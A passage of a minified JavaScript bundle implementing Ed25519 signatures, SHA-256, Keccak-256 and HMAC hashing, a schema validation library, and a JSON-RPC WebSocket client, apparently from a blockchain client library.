u&&(o=a),(h||l)&&(o=c),(St(o,r)&mt)===mt&&(o=St(-o,r)),{isValid:u||h,value:o}}const ee=(()=>xt(Vt,void 0,!0))(),re=(()=>({a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:ee,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:Xt,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:z,randomBytes:d,adjustScalarBytes:Qt,uvRatio:te}))(),ne=(()=>function(t){const e=function(t){const e=Wt(t);return dt(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}(t),{Fp:r,n,prehash:i,hash:o,randomBytes:s,nByteLength:a,h:c}=e,u=Ht<<BigInt(8*a)-Ft,h=r.create,l=xt(e.n,e.nBitLength),f=e.uvRatio||((t,e)=>{try{return{isValid:!0,value:r.sqrt(t*r.inv(e))}}catch(t){return{isValid:!1,value:qt}}}),d=e.adjustScalarBytes||(t=>t),p=e.domain||((t,e,r)=>{if(H("phflag",r),e.length||r)throw new Error("Contexts/pre-hash are not supported");return t});function g(t,e){st("coordinate "+t,e,qt,u)}function m(t){if(!(t instanceof b))throw new Error("ExtendedPoint expected")}const y=pt(((t,e)=>{const{ex:n,ey:i,ez:o}=t,s=t.is0();null==e&&(e=s?Kt:r.inv(o));const a=h(n*e),c=h(i*e),u=h(o*e);if(s)return{x:qt,y:Ft};if(u!==Ft)throw new Error("invZ was invalid");return{x:a,y:c}})),w=pt((t=>{const{a:r,d:n}=e;if(t.is0())throw new Error("bad point: ZERO");const{ex:i,ey:o,ez:s,et:a}=t,c=h(i*i),u=h(o*o),l=h(s*s),f=h(l*l),d=h(c*r);if(h(l*h(d+u))!==h(f+h(n*h(c*u))))throw new Error("bad point: equation left != right (1)");if(h(i*o)!==h(s*a))throw new Error("bad point: equation left != right (2)");return!0}));class b{constructor(t,e,r,n){this.ex=t,this.ey=e,this.ez=r,this.et=n,g("x",t),g("y",e),g("z",r),g("t",n),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(t){if(t instanceof b)throw new Error("extended point not allowed");const{x:e,y:r}=t||{};return g("x",e),g("y",r),new b(e,r,Ft,h(e*r))}static normalizeZ(t){const e=r.invertBatch(t.map((t=>t.ez)));return t.map(((t,r)=>t.toAffine(e[r]))).map(b.fromAffine)}static msm(t,e){return jt(b,l,t,e)}_setWindowSize(t){S.setWindowSize(this,t)}assertValidity(){w(this)}equals(t){m(t);const{ex:e,ey:r,ez:n}=this,{ex:i,ey:o,ez:s}=t,a=h(e*s),c=h(i*n),u=h(r*s),l=h(o*n);return a===c&&u===l}is0(){return this.equals(b.ZERO)}negate(){return new b(h(-this.ex),this.ey,this.ez,h(-this.et))}double(){const{a:t}=e,{ex:r,ey:n,ez:i}=this,o=h(r*r),s=h(n*n),a=h(Ht*h(i*i)),c=h(t*o),u=r+n,l=h(h(u*u)-o-s),f=c+s,d=f-a,p=c-s,g=h(l*d),m=h(f*p),y=h(l*p),w=h(d*f);return new b(g,m,w,y)}add(t){m(t);const{a:r,d:n}=e,{ex:i,ey:o,ez:s,et:a}=this,{ex:c,ey:u,ez:l,et:f}=t;if(r===BigInt(-1)){const t=h((o-i)*(u+c)),e=h((o+i)*(u-c)),r=h(e-t);if(r===qt)return this.double();const n=h(s*Ht*f),d=h(a*Ht*l),p=d+n,g=e+t,m=d-n,y=h(p*r),w=h(g*m),v=h(p*m),k=h(r*g);return new b(y,w,k,v)}const d=h(i*c),p=h(o*u),g=h(a*n*f),y=h(s*l),w=h((i+o)*(c+u)-d-p),v=y-g,k=y+g,S=h(p-r*d),A=h(w*v),E=h(k*S),_=h(w*S),B=h(v*k);return new b(A,E,B,_)}subtract(t){return this.add(t.negate())}wNAF(t){return S.wNAFCached(this,t,b.normalizeZ)}multiply(t){const e=t;st("scalar",e,Ft,n);const{p:r,f:i}=this.wNAF(e);return b.normalizeZ([r,i])[0]}multiplyUnsafe(t,e=b.ZERO){const r=t;return st("scalar",r,qt,n),r===qt?k:this.is0()||r===Ft?this:S.wNAFCachedUnsafe(this,r,b.normalizeZ,e)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return S.unsafeLadder(this,n).is0()}toAffine(t){return y(this,t)}clearCofactor(){const{h:t}=e;return t===Ft?this:this.multiplyUnsafe(t)}static fromHex(t,n=!1){const{d:i,a:o}=e,s=r.BYTES;t=rt("pointHex",t,s),H("zip215",n);const a=t.slice(),c=t[s-1];a[s-1]=-129&c;const l=Q(a),d=n?u:r.ORDER;st("pointHex.y",l,qt,d);const p=h(l*l),g=h(p-Ft),m=h(i*p-o);let{isValid:y,value:w}=f(g,m);if(!y)throw new Error("Point.fromHex: invalid y coordinate");const v=(w&Ft)===Ft,k=!!(128&c);if(!n&&w===qt&&k)throw new Error("Point.fromHex: x=0 and x_0=1");return k!==v&&(w=h(-w)),b.fromAffine({x:w,y:l})}static fromPrivateKey(t){return _(t).point}toRawBytes(){const{x:t,y:e}=this.toAffine(),n=et(e,r.BYTES);return n[n.length-1]|=t&Ft?128:0,n}toHex(){return $(this.toRawBytes())}}b.BASE=new b(e.Gx,e.Gy,Ft,h(e.Gx*e.Gy)),b.ZERO=new b(qt,Ft,Ft,qt);const{BASE:v,ZERO:k}=b,S=Dt(b,8*a);function A(t){return St(t,n)}function E(t){return A(Q(t))}function _(t){const e=r.BYTES;t=rt("private key",t,e);const n=rt("hashed private key",o(t),2*e),i=d(n.slice(0,e)),s=n.slice(e,2*e),a=E(i),c=v.multiply(a),u=c.toRawBytes();return{head:i,prefix:s,scalar:a,point:c,pointBytes:u}}function B(t=new Uint8Array,...e){const r=nt(...e);return E(o(p(r,rt("context",t),!!i)))}const I=$t;return v._setWindowSize(8),{CURVE:e,getPublicKey:function(t){return _(t).pointBytes},sign:function(t,e,o={}){t=rt("message",t),i&&(t=i(t));const{prefix:s,scalar:a,pointBytes:c}=_(e),u=B(o.context,s,t),h=v.multiply(u).toRawBytes(),l=A(u+B(o.context,h,c,t)*a);return st("signature.s",l,qt,n),rt("result",nt(h,et(l,r.BYTES)),2*r.BYTES)},verify:function(t,e,n,o=I){const{context:s,zip215:a}=o,c=r.BYTES;t=rt("signature",t,2*c),e=rt("message",e),n=rt("publicKey",n,c),void 0!==a&&H("zip215",a),i&&(e=i(e));const u=Q(t.slice(c,2*c));let h,l,f;try{h=b.fromHex(n,a),l=b.fromHex(t.slice(0,c),a),f=v.multiplyUnsafe(u)}catch(t){return!1}if(!a&&h.isSmallOrder())return!1;const d=B(s,l.toRawBytes(),h.toRawBytes(),e);return l.add(h.multiplyUnsafe(d)).subtract(f).clearCofactor().equals(b.ZERO)},ExtendedPoint:b,utils:{getExtendedPublicKey:_,randomPrivateKey:()=>s(r.BYTES),precompute:(t=8,e=b.BASE)=>(e._setWindowSize(t),e.multiply(BigInt(3)),e)}}}(re))();var ie=r(404),oe=r.n(ie),se=r(763),ae=r.n(se);function ce(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function ue(t,...e){if(!((r=t)instanceof Uint8Array||ArrayBuffer.isView(r)&&"Uint8Array"===r.constructor.name))throw new Error("Uint8Array expected");var r;if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function he(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function le(t,e){ue(t);const r=e.outputLen;if(t.length<r)throw new Error("digestInto() expects output buffer of length at least "+r)}const fe=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),de=(t,e)=>t<<32-e|t>>>e,pe=(()=>68===new Uint8Array(new Uint32Array([287454020]).buffer)[0])();function ge(t){for(let r=0;r<t.length;r++)t[r]=(e=t[r])<<24&4278190080|e<<8&16711680|e>>>8&65280|e>>>24&255;var e}function me(t){return"string"==typeof t&&(t=function(t){if("string"!=typeof t)throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array((new TextEncoder).encode(t))}(t)),ue(t),t}class ye{clone(){return this._cloneInto()}}function we(t){const e=e=>t().update(me(e)).digest(),r=t();return e.outputLen=r.outputLen,e.blockLen=r.blockLen,e.create=()=>t(),e}const be=(t,e,r)=>t&e^t&r^e&r;class ve extends ye{constructor(t,e,r,n){super(),this.blockLen=t,this.outputLen=e,this.padOffset=r,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(t),this.view=fe(this.buffer)}update(t){he(this);const{view:e,buffer:r,blockLen:n}=this,i=(t=me(t)).length;for(let o=0;o<i;){const s=Math.min(n-this.pos,i-o);if(s!==n)r.set(t.subarray(o,o+s),this.pos),this.pos+=s,o+=s,this.pos===n&&(this.process(e,0),this.pos=0);else{const e=fe(t);for(;n<=i-o;o+=n)this.process(e,o)}}return this.length+=t.length,this.roundClean(),this}digestInto(t){he(this),le(t,this),this.finished=!0;const{buffer:e,view:r,blockLen:n,isLE:i}=this;let{pos:o}=this;e[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>n-o&&(this.process(r,0),o=0);for(let t=o;t<n;t++)e[t]=0;!function(t,e,r,n){if("function"==typeof t.setBigUint64)return t.setBigUint64(e,r,n);const i=BigInt(32),o=BigInt(4294967295),s=Number(r>>i&o),a=Number(r&o),c=n?4:0,u=n?0:4;t.setUint32(e+c,s,n),t.setUint32(e+u,a,n)}(r,n-8,BigInt(8*this.length),i),this.process(r,0);const s=fe(t),a=this.outputLen;if(a%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const c=a/4,u=this.get();if(c>u.length)throw new Error("_sha2: outputLen bigger than state");for(let t=0;t<c;t++)s.setUint32(4*t,u[t],i)}digest(){const{buffer:t,outputLen:e}=this;this.digestInto(t);const r=t.slice(0,e);return this.destroy(),r}_cloneInto(t){t||(t=new this.constructor),t.set(...this.get());const{blockLen:e,buffer:r,length:n,finished:i,destroyed:o,pos:s}=this;return t.length=n,t.pos=s,t.finished=i,t.destroyed=o,n%e&&t.buffer.set(r),t}}const ke=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Se=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Ae=new Uint32Array(64);class Ee extends ve{constructor(){super(64,32,8,!1),this.A=0|Se[0],this.B=0|Se[1],this.C=0|Se[2],this.D=0|Se[3],this.E=0|Se[4],this.F=0|Se[5],this.G=0|Se[6],this.H=0|Se[7]}get(){const{A:t,B:e,C:r,D:n,E:i,F:o,G:s,H:a}=this;return[t,e,r,n,i,o,s,a]}set(t,e,r,n,i,o,s,a){this.A=0|t,this.B=0|e,this.C=0|r,this.D=0|n,this.E=0|i,this.F=0|o,this.G=0|s,this.H=0|a}process(t,e){for(let r=0;r<16;r++,e+=4)Ae[r]=t.getUint32(e,!1);for(let t=16;t<64;t++){const e=Ae[t-15],r=Ae[t-2],n=de(e,7)^de(e,18)^e>>>3,i=de(r,17)^de(r,19)^r>>>10;Ae[t]=i+Ae[t-7]+n+Ae[t-16]|0}let{A:r,B:n,C:i,D:o,E:s,F:a,G:c,H:u}=this;for(let t=0;t<64;t++){const e=u+(de(s,6)^de(s,11)^de(s,25))+((h=s)&a^~h&c)+ke[t]+Ae[t]|0,l=(de(r,2)^de(r,13)^de(r,22))+be(r,n,i)|0;u=c,c=a,a=s,s=o+e|0,o=i,i=n,n=r,r=e+l|0}var h;r=r+this.A|0,n=n+this.B|0,i=i+this.C|0,o=o+this.D|0,s=s+this.E|0,a=a+this.F|0,c=c+this.G|0,u=u+this.H|0,this.set(r,n,i,o,s,a,c,u)}roundClean(){Ae.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const _e=we((()=>new Ee));var Be=r(448),Ie=r(601),xe=r(184);class Me extends TypeError{constructor(t,e){let r;const{message:n,explanation:i,...o}=t,{path:s}=t,a=0===s.length?n:`At path: ${s.join(".")} -- ${n}`;super(i??a),null!=i&&(this.cause=a),Object.assign(this,o),this.name=this.constructor.name,this.failures=()=>r??(r=[t,...e()])}}function Oe(t){return"object"==typeof t&&null!=t}function Te(t){return Oe(t)&&!Array.isArray(t)}function Re(t){return"symbol"==typeof t?t.toString():"string"==typeof t?JSON.stringify(t):`${t}`}function Pe(t,e,r,n){if(!0===t)return;!1===t?t={}:"string"==typeof t&&(t={message:t});const{path:i,branch:o}=e,{type:s}=r,{refinement:a,message:c=`Expected a value of type \`${s}\`${a?` with refinement \`${a}\``:""}, but received: \`${Re(n)}\``}=t;return{value:n,type:s,refinement:a,key:i[i.length-1],path:i,branch:o,...t,message:c}}function*Ce(t,e,r,n){var i;Oe(i=t)&&"function"==typeof i[Symbol.iterator]||(t=[t]);for(const i of t){const t=Pe(i,e,r,n);t&&(yield t)}}function*Le(t,e,r={}){const{path:n=[],branch:i=[t],coerce:o=!1,mask:s=!1}=r,a={path:n,branch:i,mask:s};o&&(t=e.coercer(t,a));let c="valid";for(const n of e.validator(t,a))n.explanation=r.message,c="not_valid",yield[n,void 0];for(let[u,h,l]of e.entries(t,a)){const e=Le(h,l,{path:void 0===u?n:[...n,u],branch:void 0===u?i:[...i,h],coerce:o,mask:s,message:r.message});for(const r of e)r[0]?(c=null!=r[0].refinement?"not_refined":"not_valid",yield[r[0],void 0]):o&&(h=r[1],void 0===u?t=h:t instanceof Map?t.set(u,h):t instanceof Set?t.add(h):Oe(t)&&(void 0!==h||u in t)&&(t[u]=h))}if("not_valid"!==c)for(const n of e.refiner(t,a))n.explanation=r.message,c="not_refined",yield[n,void 0];"valid"===c&&(yield[void 0,t])}class Ne{constructor(t){const{type:e,schema:r,validator:n,refiner:i,coercer:o=t=>t,entries:s=function*(){}}=t;this.type=e,this.schema=r,this.entries=s,this.coercer=o,this.validator=n?(t,e)=>Ce(n(t,e),e,this,t):()=>[],this.refiner=i?(t,e)=>Ce(i(t,e),e,this,t):()=>[]}assert(t,e){return function(t,e,r){const n=De(t,e,{message:r});if(n[0])throw n[0]}(t,this,e)}create(t,e){return Ue(t,this,e)}is(t){return ze(t,this)}mask(t,e){return function(t,e,r){const n=De(t,e,{coerce:!0,mask:!0,message:r});if(n[0])throw n[0];return n[1]}(t,this,e)}validate(t,e={}){return De(t,this,e)}}function Ue(t,e,r){const n=De(t,e,{coerce:!0,message:r});if(n[0])throw n[0];return n[1]}function ze(t,e){return!De(t,e)[0]}function De(t,e,r={}){const n=Le(t,e,r),i=function(t){const{done:e,value:r}=t.next();return e?void 0:r}(n);return i[0]?[new Me(i[0],(function*(){for(const t of n)t[0]&&(yield t[0])})),void 0]:[void 0,i[1]]}function je(t,e){return new Ne({type:t,schema:null,validator:e})}function We(t){return new Ne({type:"array",schema:t,*entries(e){if(t&&Array.isArray(e))for(const[r,n]of e.entries())yield[r,n,t]},coercer:t=>Array.isArray(t)?t.slice():t,validator:t=>Array.isArray(t)||`Expected an array value, but received: ${Re(t)}`})}function qe(){return je("boolean",(t=>"boolean"==typeof t))}function Fe(t){return je("instance",(e=>e instanceof t||`Expected a \`${t.name}\` instance, but received: ${Re(e)}`))}function He(t){const e=Re(t),r=typeof t;return new Ne({type:"literal",schema:"string"===r||"number"===r||"boolean"===r?t:null,validator:r=>r===t||`Expected the literal \`${e}\`, but received: ${Re(r)}`})}function Ke(t){return new Ne({...t,validator:(e,r)=>null===e||t.validator(e,r),refiner:(e,r)=>null===e||t.refiner(e,r)})}function $e(){return je("number",(t=>"number"==typeof t&&!isNaN(t)||`Expected a number, but received: ${Re(t)}`))}function Ve(t){return new Ne({...t,validator:(e,r)=>void 0===e||t.validator(e,r),refiner:(e,r)=>void 0===e||t.refiner(e,r)})}function Ge(t,e){return new Ne({type:"record",schema:null,*entries(r){if(Oe(r))for(const n in r){const i=r[n];yield[n,n,t],yield[n,i,e]}},validator:t=>Te(t)||`Expected an object, but received: ${Re(t)}`,coercer:t=>Te(t)?{...t}:t})}function Je(){return je("string",(t=>"string"==typeof t||`Expected a string, but received: ${Re(t)}`))}function Ze(t){const e=je("never",(()=>!1));return new Ne({type:"tuple",schema:null,*entries(r){if(Array.isArray(r)){const n=Math.max(t.length,r.length);for(let i=0;i<n;i++)yield[i,r[i],t[i]||e]}},validator:t=>Array.isArray(t)||`Expected an array, but received: ${Re(t)}`,coercer:t=>Array.isArray(t)?t.slice():t})}function Ye(t){const e=Object.keys(t);return new Ne({type:"type",schema:t,*entries(r){if(Oe(r))for(const n of e)yield[n,r[n],t[n]]},validator:t=>Te(t)||`Expected an object, but received: ${Re(t)}`,coercer:t=>Te(t)?{...t}:t})}function Xe(t){const e=t.map((t=>t.type)).join(" | ");return new Ne({type:"union",schema:null,coercer(e,r){for(const n of t){const[t,i]=n.validate(e,{coerce:!0,mask:r.mask});if(!t)return i}return e},validator(r,n){const i=[];for(const e of t){const[...t]=Le(r,e,n),[o]=t;if(!o[0])return[];for(const[e]of t)e&&i.push(e)}return[`Expected the value to satisfy a union of \`${e}\`, but received: ${Re(r)}`,...i]}})}function Qe(){return je("unknown",(()=>!0))}function tr(t,e,r){return new Ne({...t,coercer:(n,i)=>ze(n,e)?t.coercer(r(n,i),i):t.coercer(n,i)})}var er=r(22),rr=r.n(er),nr=r(228),ir=class extends nr{socket;constructor(t,e,r){super(),this.socket=new window.WebSocket(t,r),this.socket.onopen=()=>this.emit("open"),this.socket.onmessage=t=>this.emit("message",t.data),this.socket.onerror=t=>this.emit("error",t),this.socket.onclose=t=>{this.emit("close",t.code,t.reason)}}send(t,e,r){const n=r||e;try{this.socket.send(t),n()}catch(t){n(t)}}close(t,e){this.socket.close(t,e)}addEventListener(t,e,r){this.socket.addEventListener(t,e,r)}};var or=class{encode(t){return JSON.stringify(t)}decode(t){return JSON.parse(t)}},sr=class extends nr{address;rpc_id;queue;options;autoconnect;ready;reconnect;reconnect_timer_id;reconnect_interval;max_reconnects;rest_options;current_reconnects;generate_request_id;socket;webSocketFactory;dataPack;constructor(t,e="ws://localhost:8080",{autoconnect:r=!0,reconnect:n=!0,reconnect_interval:i=1e3,max_reconnects:o=5,...s}={},a,c){super(),this.webSocketFactory=t,this.queue={},this.rpc_id=0,this.address=e,this.autoconnect=r,this.ready=!1,this.reconnect=n,this.reconnect_timer_id=void 0,this.reconnect_interval=i,this.max_reconnects=o,this.rest_options=s,this.current_reconnects=0,this.generate_request_id=a||(()=>++this.rpc_id),this.dataPack=c||new or,this.autoconnect&&this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}connect(){this.socket||this._connect(this.address,{autoconnect:this.autoconnect,reconnect:this.reconnect,reconnect_interval:this.reconnect_interval,max_reconnects:this.max_reconnects,...this.rest_options})}call(t,e,r,n){return n||"object"!=typeof r||(n=r,r=null),new Promise(((i,o)=>{if(!this.ready)return o(new Error("socket not ready"));const s=this.generate_request_id(t,e),a={jsonrpc:"2.0",method:t,params:e||void 0,id:s};this.socket.send(this.dataPack.encode(a),n,(t=>{if(t)return o(t);this.queue[s]={promise:[i,o]},r&&(this.queue[s].timeout=setTimeout((()=>{delete this.queue[s],o(new Error("reply timeout"))}),r))}))}))}async login(t){const e=await this.call("rpc.login",t);if(!e)throw new Error("authentication failed");return e}async listMethods(){return await this.call("__listMethods")}notify(t,e){return new Promise(((r,n)=>{if(!this.ready)return n(new Error("socket not ready"));const i={jsonrpc:"2.0",method:t,params:e};this.socket.send(this.dataPack.encode(i),(t=>{if(t)return n(t);r()}))}))}async subscribe(t){"string"==typeof t&&(t=[t]);const e=await this.call("rpc.on",t);if("string"==typeof t&&"ok"!==e[t])throw new Error("Failed subscribing to an event '"+t+"' with: "+e[t]);return e}async unsubscribe(t){"string"==typeof t&&(t=[t]);const e=await this.call("rpc.off",t);if("string"==typeof t&&"ok"!==e[t])throw new Error("Failed unsubscribing from an event with: "+e);return e}close(t,e){this.socket.close(t||1e3,e)}setAutoReconnect(t){this.reconnect=t}setReconnectInterval(t){this.reconnect_interval=t}setMaxReconnects(t){this.max_reconnects=t}_connect(t,e){clearTimeout(this.reconnect_timer_id),this.socket=this.webSocketFactory(t,e),this.socket.addEventListener("open",(()=>{this.ready=!0,this.emit("open"),this.current_reconnects=0})),this.socket.addEventListener("message",(({data:t})=>{t instanceof ArrayBuffer&&(t=n.Buffer.from(t).toString());try{t=this.dataPack.decode(t)}catch(t){return}if(t.notification&&this.listeners(t.notification).length){if(!Object.keys(t.params).length)return this.emit(t.notification);const e=[t.notification];if(t.params.constructor===Object)e.push(t.params);else for(let r=0;r<t.params.length;r++)e.push(t.params[r]);return Promise.resolve().then((()=>{this.emit.apply(this,e)}))}if(!this.queue[t.id])return t.method?Promise.resolve().then((()=>{this.emit(t.method,t?.params)})):void 0;"error"in t=="result"in t&&this.queue[t.id].promise[1](new Error('Server response malformed. Response must include either "result" or "error", but not both.')),this.queue[t.id].timeout&&clearTimeout(this.queue[t.id].timeout),t.error?this.queue[t.id].promise[1](t.error):this.queue[t.id].promise[0](t.result),delete this.queue[t.id]})),this.socket.addEventListener("error",(t=>this.emit("error",t))),this.socket.addEventListener("close",(({code:r,reason:n})=>{this.ready&&setTimeout((()=>this.emit("close",r,n)),0),this.ready=!1,this.socket=void 0,1e3!==r&&(this.current_reconnects++,this.reconnect&&(this.max_reconnects>this.current_reconnects||0===this.max_reconnects)&&(this.reconnect_timer_id=setTimeout((()=>this._connect(t,e)),this.reconnect_interval)))}))}};const ar=BigInt(2**32-1),cr=BigInt(32);function ur(t,e=!1){return e?{h:Number(t&ar),l:Number(t>>cr&ar)}:{h:0|Number(t>>cr&ar),l:0|Number(t&ar)}}function hr(t,e=!1){let r=new Uint32Array(t.length),n=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l:s}=ur(t[i],e);[r[i],n[i]]=[o,s]}return[r,n]}const lr=[],fr=[],dr=[],pr=BigInt(0),gr=BigInt(1),mr=BigInt(2),yr=BigInt(7),wr=BigInt(256),br=BigInt(113);for(let t=0,e=gr,r=1,n=0;t<24;t++){[r,n]=[n,(2*r+3*n)%5],lr.push(2*(5*n+r)),fr.push((t+1)*(t+2)/2%64);let i=pr;for(let t=0;t<7;t++)e=(e<<gr^(e>>yr)*br)%wr,e&mr&&(i^=gr<<(gr<<BigInt(t))-gr);dr.push(i)}const[vr,kr]=hr(dr,!0),Sr=(t,e,r)=>r>32?((t,e,r)=>e<<r-32|t>>>64-r)(t,e,r):((t,e,r)=>t<<r|e>>>32-r)(t,e,r),Ar=(t,e,r)=>r>32?((t,e,r)=>t<<r-32|e>>>64-r)(t,e,r):((t,e,r)=>e<<r|t>>>32-r)(t,e,r);class Er extends ye{constructor(t,e,r,n=!1,i=24){if(super(),this.blockLen=t,this.suffix=e,this.outputLen=r,this.enableXOF=n,this.rounds=i,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,ce(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");var o;this.state=new Uint8Array(200),this.state32=(o=this.state,new Uint32Array(o.buffer,o.byteOffset,Math.floor(o.byteLength/4)))}keccak(){pe||ge(this.state32),function(t,e=24){const r=new Uint32Array(10);for(let n=24-e;n<24;n++){for(let e=0;e<10;e++)r[e]=t[e]^t[e+10]^t[e+20]^t[e+30]^t[e+40];for(let e=0;e<10;e+=2){const n=(e+8)%10,i=(e+2)%10,o=r[i],s=r[i+1],a=Sr(o,s,1)^r[n],c=Ar(o,s,1)^r[n+1];for(let r=0;r<50;r+=10)t[e+r]^=a,t[e+r+1]^=c}let e=t[2],i=t[3];for(let r=0;r<24;r++){const n=fr[r],o=Sr(e,i,n),s=Ar(e,i,n),a=lr[r];e=t[a],i=t[a+1],t[a]=o,t[a+1]=s}for(let e=0;e<50;e+=10){for(let n=0;n<10;n++)r[n]=t[e+n];for(let n=0;n<10;n++)t[e+n]^=~r[(n+2)%10]&r[(n+4)%10]}t[0]^=vr[n],t[1]^=kr[n]}r.fill(0)}(this.state32,this.rounds),pe||ge(this.state32),this.posOut=0,this.pos=0}update(t){he(this);const{blockLen:e,state:r}=this,n=(t=me(t)).length;for(let i=0;i<n;){const o=Math.min(e-this.pos,n-i);for(let e=0;e<o;e++)r[this.pos++]^=t[i++];this.pos===e&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:t,suffix:e,pos:r,blockLen:n}=this;t[r]^=e,128&e&&r===n-1&&this.keccak(),t[n-1]^=128,this.keccak()}writeInto(t){he(this,!1),ue(t),this.finish();const e=this.state,{blockLen:r}=this;for(let n=0,i=t.length;n<i;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,i-n);t.set(e.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return t}xofInto(t){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(t)}xof(t){return ce(t),this.xofInto(new Uint8Array(t))}digestInto(t){if(le(t,this),this.finished)throw new Error("digest() was already called");return this.writeInto(t),this.destroy(),t}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(t){const{blockLen:e,suffix:r,outputLen:n,rounds:i,enableXOF:o}=this;return t||(t=new Er(e,r,n,o,i)),t.state32.set(this.state32),t.pos=this.pos,t.posOut=this.posOut,t.finished=this.finished,t.rounds=i,t.suffix=r,t.outputLen=n,t.enableXOF=o,t.destroyed=this.destroyed,t}}const _r=((t,e,r)=>we((()=>new Er(e,t,r))))(1,136,32),Br=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Ir=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),xr=new Uint32Array(64);class Mr extends g{constructor(){super(64,32,8,!1),this.A=0|Ir[0],this.B=0|Ir[1],this.C=0|Ir[2],this.D=0|Ir[3],this.E=0|Ir[4],this.F=0|Ir[5],this.G=0|Ir[6],this.H=0|Ir[7]}get(){const{A:t,B:e,C:r,D:n,E:i,F:o,G:s,H:a}=this;return[t,e,r,n,i,o,s,a]}set(t,e,r,n,i,o,s,a){this.A=0|t,this.B=0|e,this.C=0|r,this.D=0|n,this.E=0|i,this.F=0|o,this.G=0|s,this.H=0|a}process(t,e){for(let r=0;r<16;r++,e+=4)xr[r]=t.getUint32(e,!1);for(let t=16;t<64;t++){const e=xr[t-15],r=xr[t-2],n=u(e,7)^u(e,18)^e>>>3,i=u(r,17)^u(r,19)^r>>>10;xr[t]=i+xr[t-7]+n+xr[t-16]|0}let{A:r,B:n,C:i,D:o,E:s,F:a,G:c,H:h}=this;for(let t=0;t<64;t++){const e=h+(u(s,6)^u(s,11)^u(s,25))+((l=s)&a^~l&c)+Br[t]+xr[t]|0,f=(u(r,2)^u(r,13)^u(r,22))+p(r,n,i)|0;h=c,c=a,a=s,s=o+e|0,o=i,i=n,n=r,r=e+f|0}var l;r=r+this.A|0,n=n+this.B|0,i=i+this.C|0,o=o+this.D|0,s=s+this.E|0,a=a+this.F|0,c=c+this.G|0,h=h+this.H|0,this.set(r,n,i,o,s,a,c,h)}roundClean(){xr.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const Or=f((()=>new Mr));class Tr extends l{constructor(t,e){super(),this.finished=!1,this.destroyed=!1,function(t){if("function"!=typeof t||"function"!=typeof t.create)throw new Error("Hash should be wrapped by utils.wrapConstructor");i(t.outputLen),i(t.blockLen)}(t);const r=h(e);if(this.iHash=t.create(),"function"!=typeof this.iHash.update)throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,o=new Uint8Array(n);o.set(r.length>n?t.create().update(r).digest():r);for(let t=0;t<o.length;t++)o[t]^=54;this.iHash.update(o),this.oHash=t.create();for(let t=0;t<o.length;t++)o[t]^=106;this.oHash.update(o),o.fill(0)}update(t){return s(this),this.iHash.update(t),this}digestInto(t){s(this),o(t,this.outputLen),this.finished=!0,this.iHash.digestInto(t),this.oHash.update(t),this.oHash.digestInto(t),this.destroy()}digest(){const t=new Uint8Array(this.oHash.outputLen);return this.digestInto(t),t}_cloneInto(t){t||(t=Object.create(Object.getPrototypeOf(this),{}));const{oHash:e,iHash:r,finished:n,destroyed:i,blockLen:o,outputLen:s}=this;return 